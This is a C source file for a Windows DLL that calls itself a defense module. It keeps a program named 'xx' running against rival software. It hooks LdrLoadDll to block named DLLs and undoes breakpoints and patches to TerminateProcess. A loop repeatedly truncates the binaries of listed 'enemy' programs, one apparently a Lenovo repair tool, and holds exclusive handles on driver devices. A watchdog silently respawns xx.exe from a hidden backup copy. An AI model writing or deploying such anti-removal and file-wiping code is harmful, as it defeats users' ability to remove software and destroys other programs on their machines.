/*
 * defense.dll - xx 合并防御模块
 *
 * 合并内容：
 *   [xx 原有防御] 心跳看门狗（xx.exe 掉线则从 xxres.bin 复活）+ 自保备份
 *   [新 yy 防御]  敌人二进制文件独占锁 / BYOVD 设备锁 / VEH 冷镜像自愈 /
 *                 kernel32!TerminateProcess 字节还原 / LdrLoadDll 反注入 Hook
 *
 * 运行位置：只在 xx 自身进程内（不扩散、不注入别的进程）。
 *
 * 刻意不装 NtCreateThreadEx / NtQueueApcThread Hook：
 *   本地 hook 拦不到“别人往我这儿建线程”，只会干扰 xx 自己（yy 就是被这个自伤的）。
 *   LdrLoadDll Hook 则有效——注入方让 xx 去 LoadLibrary 时，执行发生在 xx 进程内，
 *   这个 hook 能看到并拦截。
 *
 * 编译：gcc -shared -o defense.dll defense.c -luser32 -ladvapi32 -lpsapi -lshell32 -Wl,--export-all-symbols
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shellapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ---- 共享内存 / 心跳常量（与 xx.c 保持一致） ---- */
#define SHARED_MEM_NAME   L"Global\\xx_shared_mem"
#define SHARED_MEM_SIZE   4096
#define OFFSET_HB_SUFFIX  0
#define HEARTBEAT_PREFIX  L"Global\\xx_heartbeat_"
#define XX_EXE_NAME       L"xx.exe"
#define XX_BACKUP_NAME    L"xxres.bin"
#define HEARTBEAT_TIMEOUT 2000

/* ---- 要锁死/清空的对方二进制名单（可按需增删） ---- */
const WCHAR *g_enemyFiles[] = {
    L"yy.exe", L"lenovo_fix.exe", L"guard.dll", L"ww.exe", NULL
};

/* ---- 要拦截加载进 xx 的对方 DLL 名单（同名 guard.dll 会用路径区分） ---- */
const WCHAR *g_enemyDlls[] = {
    L"guard.dll", NULL
};

/* ---- BYOVD 漏洞驱动设备符号链接 ---- */
const WCHAR *g_byovd[] = {
    L"\\\\.\\BootRepair", L"\\\\.\\kdmapper", L"\\\\.\\kdu", L"\\\\.\\GIO", NULL
};

#define MAX_LOCKS 32

CRITICAL_SECTION g_cs;
BOOL      g_csInit   = FALSE;
BOOL      g_defInit  = FALSE;
WCHAR     g_ownDir[MAX_PATH]   = L"";
WCHAR     g_ownGuard[MAX_PATH] = L"";

HANDLE g_fileLocks[MAX_LOCKS];
BOOL   g_fileLocked[MAX_LOCKS];
HANDLE g_devLocks[8];

/* .text 冷镜像备份（VEH 自愈用） */
void* g_textBase = NULL;
SIZE_T g_textSize = 0;
BYTE*  g_textBackup = NULL;

typedef NTSTATUS (NTAPI *fnLdrLoadDll)(PWSTR, PULONG, PUNICODE_STRING, PHANDLE);
fnLdrLoadDll g_pfnLdrLoadDll = NULL;

/* ================== 小工具 ================== */
void EnsureCs(void) {
    if (!g_csInit) { InitializeCriticalSection(&g_cs); g_csInit = TRUE; }
}

const WCHAR* BaseName(const WCHAR *p) {
    const WCHAR *s = wcsrchr(p, L'\\');
    return s ? s + 1 : p;
}

BOOL NameInList(const WCHAR *name, const WCHAR **list) {
    for (int i = 0; list[i]; i++)
        if (_wcsicmp(name, list[i]) == 0) return TRUE;
    return FALSE;
}

void GetOwnDir(void) {
    WCHAR p[MAX_PATH] = L"";
    GetModuleFileNameW(GetModuleHandleW(L"defense.dll"), p, MAX_PATH);
    WCHAR *s = wcsrchr(p, L'\\');
    if (s) s[1] = L'\0';
    wcscpy_s(g_ownDir, MAX_PATH, p);
    swprintf_s(g_ownGuard, MAX_PATH, L"%sguard.dll", g_ownDir);
}

/* ================== 反注入 Hook（trampoline，避免递归/劈坏指令） ================== */

/* 判定函数前导完整指令长度（>=14 才塞得下绝对跳转）；识别不了返回 -1 */
int PrologueLen(void *func) {
    unsigned char *p = (unsigned char*)func;
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xDC) return 18;                 /* LdrLoadDll (Win8+) */
    if (p[0] == 0x48 && p[1] == 0x89 && p[2] == 0x5C && p[3] == 0x24) return 15; /* LdrLoadDll (Win7) */
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {          /* syscall stub */
        if (p[8] == 0xF6 && p[9] == 0x04 && p[10] == 0x25) return 16;            /* Win8+ */
        if (p[8] == 0x0F && p[9] == 0x05) return 16;                             /* Win7 */
    }
    return -1;
}

/* trampoline：保存原文前 n 字节 + 跳回 func+n */
void* MakeTrampoline(void *func, int n) {
    unsigned char *t = (unsigned char*)VirtualAlloc(NULL, 64, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!t) return NULL;
    memcpy(t, func, n);
    t[n + 0] = 0xFF; t[n + 1] = 0x25;   /* jmp qword ptr [rip+0] */
    t[n + 2] = 0;    t[n + 3] = 0; t[n + 4] = 0; t[n + 5] = 0;
    *(void**)(t + n + 6) = (unsigned char*)func + n;
    return t;
}

/* 安装 14 字节绝对跳转 hook，返回可调用原函数的 trampoline */
BOOL InstallHook(void *pTarget, void *pSpy, void **outTramp) {
    int n = PrologueLen(pTarget);
    if (n < 14) return FALSE;
    void *tramp = MakeTrampoline(pTarget, n);
    if (!tramp) return FALSE;
    unsigned char stub[32];
    for (int i = 0; i < n; i++) stub[i] = 0x90;
    stub[0] = 0xFF; stub[1] = 0x25;
    stub[2] = 0;    stub[3] = 0; stub[4] = 0; stub[5] = 0;
    *(void**)(stub + 6) = pSpy;
    DWORD op;
    if (!VirtualProtect(pTarget, n, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
    memcpy(pTarget, stub, n);
    VirtualProtect(pTarget, n, op, &op);
    *outTramp = tramp;
    return TRUE;
}

/* 拦截加载对方 DLL；同名的我方 guard.dll 用完整路径放行 */
NTSTATUS NTAPI SpyLdrLoadDll(PWSTR PathToFile, PULONG Flags, PUNICODE_STRING ModuleFileName, PHANDLE ModuleHandle) {
    if (ModuleFileName && ModuleFileName->Buffer) {
        const WCHAR *nm = BaseName(ModuleFileName->Buffer);
        if (NameInList(nm, g_enemyDlls)) {
            if (!(g_ownGuard[0] && _wcsicmp(ModuleFileName->Buffer, g_ownGuard) == 0)) {
                return 0xC0000022; /* STATUS_ACCESS_DENIED */
            }
        }
    }
    return g_pfnLdrLoadDll(PathToFile, Flags, ModuleFileName, ModuleHandle);
}

BOOL InstallLdrLoadDllHook(void) {
    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    if (!hMod) return FALSE;
    void *pTarget = (void*)GetProcAddress(hMod, "LdrLoadDll");
    if (!pTarget) return FALSE;
    void *tramp = NULL;
    if (!InstallHook(pTarget, (void*)SpyLdrLoadDll, &tramp)) return FALSE;
    g_pfnLdrLoadDll = (fnLdrLoadDll)tramp;
    return TRUE;
}

/* ================== VEH 冷镜像自愈 ================== */
LONG WINAPI SelfHealVeh(PEXCEPTION_POINTERS pEx) {
    if (pEx->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {
        void *addr = pEx->ExceptionRecord->ExceptionAddress;
        if (g_textBackup && (BYTE*)addr >= (BYTE*)g_textBase && (BYTE*)addr < (BYTE*)g_textBase + g_textSize) {
            SIZE_T off = (BYTE*)addr - (BYTE*)g_textBase;
            DWORD op;
            if (VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &op)) {
                *(BYTE*)addr = g_textBackup[off];
                VirtualProtect(addr, 1, op, &op);
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

void InitImageBackup(void) {
    HMODULE h = GetModuleHandleW(NULL);
    if (!h) return;
    g_textBase = h;
    g_textSize = 0x50000;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)h;
    if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)h + dos->e_lfanew);
        if (nt->Signature == IMAGE_NT_SIGNATURE) {
            g_textBase = (BYTE*)h + nt->OptionalHeader.BaseOfCode;
            g_textSize = nt->OptionalHeader.SizeOfCode;
        }
    }
    g_textBackup = (BYTE*)malloc(g_textSize);
    if (g_textBackup) memcpy(g_textBackup, g_textBase, g_textSize);
}

/* ================== TerminateProcess 字节还原 ================== */
DWORD WINAPI ShieldThread(LPVOID lp) {
    UNREFERENCED_PARAMETER(lp);
    HMODULE h = GetModuleHandleW(L"kernel32.dll");
    if (!h) return 0;
    BYTE *tp = (BYTE*)GetProcAddress(h, "TerminateProcess");
    if (!tp) return 0;
    BYTE cache[5];
    memcpy(cache, tp, 5);
    for (;;) {
        DWORD op;
        if (VirtualProtect(tp, 5, PAGE_EXECUTE_READWRITE, &op)) {
            memcpy(tp, cache, 5);
            VirtualProtect(tp, 5, op, &op);
        }
        Sleep(30);
    }
    return 0;
}

/* ================== 敌人二进制独占锁 ================== */
void LockEnemyFiles(void) {
    EnsureCs();
    EnterCriticalSection(&g_cs);
    for (int i = 0; g_enemyFiles[i] && i < MAX_LOCKS; i++) {
        if (g_fileLocked[i]) continue;
        HANDLE h = CreateFileW(g_enemyFiles[i], GENERIC_READ | GENERIC_WRITE, 0,
                               NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE) { g_fileLocks[i] = h; g_fileLocked[i] = TRUE; }
    }
    LeaveCriticalSection(&g_cs);
}

void ReleaseEnemyFiles(void) {
    EnsureCs();
    EnterCriticalSection(&g_cs);
    for (int i = 0; i < MAX_LOCKS; i++) {
        if (g_fileLocks[i]) {
            CloseHandle(g_fileLocks[i]);
            g_fileLocks[i] = NULL;
            g_fileLocked[i] = FALSE;
        }
    }
    LeaveCriticalSection(&g_cs);
}

DWORD WINAPI FileLockThread(LPVOID lp) {
    UNREFERENCED_PARAMETER(lp);
    for (;;) { LockEnemyFiles(); Sleep(1000); }
    return 0;
}

void LockByovd(void) {
    for (int i = 0; g_byovd[i] && i < 8; i++) {
        if (!g_devLocks[i])
            g_devLocks[i] = CreateFileW(g_byovd[i], GENERIC_READ | GENERIC_WRITE, 0,
                                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    }
}

/* ================== 心跳看门狗（xx 掉线则复活） ================== */
BOOL IsXxRunning(void) {
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    PROCESSENTRY32W pe = { sizeof(pe) };
    BOOL found = FALSE;
    if (Process32FirstW(h, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, XX_EXE_NAME) == 0) { found = TRUE; break; }
        } while (Process32NextW(h, &pe));
    }
    CloseHandle(h);
    return found;
}

void EnsureXxRunning(void) {
    if (IsXxRunning()) return;
    WCHAR xx[MAX_PATH];
    swprintf_s(xx, MAX_PATH, L"%s" XX_EXE_NAME, g_ownDir);
    if (GetFileAttributesW(xx) == INVALID_FILE_ATTRIBUTES) {
        WCHAR bak[MAX_PATH];
        swprintf_s(bak, MAX_PATH, L"%s" XX_BACKUP_NAME, g_ownDir);
        if (GetFileAttributesW(bak) != INVALID_FILE_ATTRIBUTES)
            CopyFileW(bak, xx, FALSE);
    }
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (CreateProcessW(xx, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, g_ownDir, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

DWORD WINAPI WatchdogThread(LPVOID lp) {
    UNREFERENCED_PARAMETER(lp);
    WCHAR suffix[64] = L"";
    for (int i = 0; i < 50 && suffix[0] == L'\0'; i++) {
        HANDLE hMap = OpenFileMappingW(FILE_MAP_READ, FALSE, SHARED_MEM_NAME);
        if (hMap) {
            void *v = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, SHARED_MEM_SIZE);
            if (v) {
                wcsncpy_s(suffix, _countof(suffix), (WCHAR*)v, _TRUNCATE);
                UnmapViewOfFile(v);
            }
            CloseHandle(hMap);
        }
        if (suffix[0] == L'\0') Sleep(100);
    }
    if (suffix[0] == L'\0') return 0;

    WCHAR evName[128];
    swprintf_s(evName, _countof(evName), L"%s%s", HEARTBEAT_PREFIX, suffix);
    HANDLE hEv = OpenEventW(SYNCHRONIZE, FALSE, evName);
    if (!hEv) return 0;

    for (;;) {
        if (WaitForSingleObject(hEv, HEARTBEAT_TIMEOUT) == WAIT_TIMEOUT)
            EnsureXxRunning();
    }
}

/* ================== 对外入口 ================== */
__declspec(dllexport) void WINAPI StartDefense(void) {
    EnsureCs();
    if (g_defInit) return;
    g_defInit = TRUE;

    for (int i = 0; i < MAX_LOCKS; i++) { g_fileLocks[i] = NULL; g_fileLocked[i] = FALSE; }
    for (int i = 0; i < 8; i++) g_devLocks[i] = NULL;

    GetOwnDir();
    InitImageBackup();
    AddVectoredExceptionHandler(1, SelfHealVeh);
    InstallLdrLoadDllHook();

    LockEnemyFiles();
    LockByovd();

    CreateThread(NULL, 0, FileLockThread, NULL, 0, NULL);
    CreateThread(NULL, 0, ShieldThread,   NULL, 0, NULL);
    CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);
}

/* 供外部手动释放（测试/收尾用） */
__declspec(dllexport) void WINAPI StopDefense(void) {
    ReleaseEnemyFiles();
    for (int i = 0; i < 8; i++) {
        if (g_devLocks[i]) { CloseHandle(g_devLocks[i]); g_devLocks[i] = NULL; }
    }
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
    UNREFERENCED_PARAMETER(reserved);
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinst);
    }
    return TRUE;
}
